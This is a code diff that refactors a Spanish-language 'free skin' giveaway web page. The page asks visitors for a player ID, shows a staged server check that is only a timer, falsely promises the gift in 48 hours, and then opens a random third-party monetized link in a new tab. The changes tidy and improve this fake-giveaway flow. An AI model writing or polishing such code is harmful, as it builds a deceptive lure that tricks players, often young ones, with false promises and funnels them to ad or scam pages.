@@ -33,7 +33,7 @@
       color: var(--primary-color); text-shadow: 0 0 15px var(--primary-color);
       margin-bottom: 1.5rem;
     }
-    .menu { display: flex; justify-content: center; gap: 0.5rem; margin-bottom: 2rem; }
+    .menu { display: flex; justify-content: center; flex-wrap: wrap; gap: 0.5rem; margin-bottom: 2rem; }
     .menu-item {
       color: white; text-decoration: none; font-weight: 700;
       padding: 0.6rem 1rem; border-radius: 50px;
@@ -128,24 +128,31 @@
       <h1>Selecciona tu skin favorita</h1>
     </div>
     <div class="skins" id="skins"></div>
+
     <div class="popup" id="popup-id">
       <div class="popup-content">
         <h2>Ingresa tu ID</h2>
-        <input type="text" id="player-id" placeholder="Tu ID de jugador">
+        <input type="number" id="player-id" placeholder="Tu ID de jugador" pattern="\d*">
         <div class="popup-buttons">
-          <button class="btn" onclick="verificarID()">Ganar</button>
-          <button class="btn secondary" onclick="cerrarPopupID()">Volver</button>
+          <button class="btn" id="btn-ganar">Ganar</button>
+          <button class="btn secondary" id="btn-volver">Volver</button>
         </div>
       </div>
     </div>
+
     <div class="popup" id="popup-final">
       <div class="popup-content">
-        <div id="verificado-text">
+        <div id="loading-state">
             <h2>Verificando</h2>
             <div class="spinner"></div>
             <p>Conectando con el servidor...</p>
         </div>
-        <div id="skin-seleccionada-popup" style="margin-top: 1rem;"></div>
+        <div id="success-state" style="display: none;">
+            <h2>¡Éxito!</h2>
+            <p id="success-message"></p>
+            <div id="skin-seleccionada-popup" style="margin-top: 1rem;"></div>
+            <p style="margin-top:1rem; font-size:0.8rem; color: #ccc;">¡Vuelve pronto para reclamar más!</p>
+        </div>
       </div>
     </div>
   </div>
@@ -159,7 +166,18 @@
             'images/17.png', 'images/18.png', 'images/19.png', 'images/skin20.jpg'
         ];
         
+        // --- Referencias a Elementos del DOM ---
         const skinsContainer = document.getElementById('skins');
+        const popupID = document.getElementById('popup-id');
+        const popupFinal = document.getElementById('popup-final');
+        const skinContenedorPopup = document.getElementById('skin-seleccionada-popup');
+        const loadingState = document.getElementById('loading-state');
+        const successState = document.getElementById('success-state');
+        const successMessage = document.getElementById('success-message');
+        const playerIdInput = document.getElementById('player-id');
+        let skinSeleccionada = '';
+
+        // --- Cargar las skins dinámicamente ---
         skins.forEach((src, index) => {
             const skinCard = document.createElement('div');
             skinCard.className = 'skin-card';
@@ -167,7 +185,8 @@
             img.src = src;
             img.alt = `Skin ${index + 1}`;
             skinCard.appendChild(img);
-            skinCard.onclick = () => seleccionarSkin(src);
+            // CORRECCIÓN: Usar addEventListener para más claridad
+            skinCard.addEventListener('click', () => seleccionarSkin(src));
             skinCard.style.animationDelay = `${index * 0.05}s`;
             if (src.includes('skin20.jpg')) {
                 skinCard.classList.add('skin-exclusiva');
@@ -175,24 +194,24 @@
             skinsContainer.appendChild(skinCard);
         });
 
-        const popupID = document.getElementById('popup-id');
-        const popupFinal = document.getElementById('popup-final');
-        const skinContenedorPopup = document.getElementById('skin-seleccionada-popup');
-        const verificadoText = document.getElementById('verificado-text');
-        let skinSeleccionada = '';
-
-        window.seleccionarSkin = function(src) {
+        // --- Funciones de Lógica ---
+        function seleccionarSkin(src) {
             skinSeleccionada = src;
             popupID.classList.add('visible');
         }
 
-        window.verificarID = function() {
-            const playerId = document.getElementById('player-id').value;
-            if (playerId.length < 5) { alert('Por favor ingresa un ID válido'); return; }
+        function verificarID() {
+            const playerId = playerIdInput.value;
+            if (playerId.length < 5) {
+                alert('Por favor ingresa un ID válido de solo números');
+                return;
+            }
             
             popupID.classList.remove('visible');
             popupFinal.classList.add('visible');
-            verificadoText.innerHTML = `<h2>Verificando</h2><div class="spinner"></div><p>Conectando con el servidor...</p>`;
+            // Resetea los estados del popup final
+            loadingState.style.display = 'block';
+            successState.style.display = 'none';
             skinContenedorPopup.innerHTML = '';
 
             setTimeout(() => {
@@ -201,9 +220,12 @@
                 
                 skinContenedorPopup.innerHTML = `<img src="${skinSeleccionada}" style="width:120px; height:160px; border-radius:8px; border:3px solid var(--primary-color);">`;
                 
-                // --- NUEVA FUNCIONALIDAD ---
-                verificadoText.innerHTML = `<h2>¡Éxito!</h2><p>ID: ${playerId}<br>Tu regalo llegará en 48 horas.</p><p style="margin-top:1rem; font-size:0.8rem; color: #ccc;">¡Vuelve pronto para reclamar más!</p>`;
+                // Muestra el estado de éxito
+                loadingState.style.display = 'none';
+                successState.style.display = 'block';
+                successMessage.innerHTML = `ID: ${playerId}<br>Tu regalo llegará en 48 horas.`;
                 
+                // Redirección después de 2 segundos
                 setTimeout(() => {
                     const redirectLinks = [
                         'https://politicsgrowinghollow.com/ejnk26r6rc?key=4eed37f3566b5c144e2b0cba6bc9827c',
@@ -212,14 +234,30 @@
                     ];
                     const randomLink = redirectLinks[Math.floor(Math.random() * redirectLinks.length)];
                     window.open(randomLink, '_blank');
-                }, 2000); // Espera 2 segundos antes de abrir la nueva pestaña
-                // --- FIN DE LA NUEVA FUNCIONALIDAD ---
+                }, 2000);
 
             }, 2500);
         }
         
-        window.cerrarPopupID = () => { popupID.classList.remove('visible'); }
-        popupFinal.onclick = () => { popupFinal.classList.remove('visible'); };
+        function cerrarPopupID() {
+            popupID.classList.remove('visible');
+        }
+
+        // --- Asignación de Eventos (Event Listeners) ---
+        document.getElementById('btn-ganar').addEventListener('click', verificarID);
+        document.getElementById('btn-volver').addEventListener('click', cerrarPopupID);
+
+        // MEJORA: Permitir cerrar los popups haciendo clic en el fondo oscuro
+        popupID.addEventListener('click', (e) => {
+            if (e.target === popupID) {
+                cerrarPopupID();
+            }
+        });
+        popupFinal.addEventListener('click', (e) => {
+            if (e.target === popupFinal) {
+                popupFinal.classList.remove('visible');
+            }
+        });
     });
   </script>
 </body>
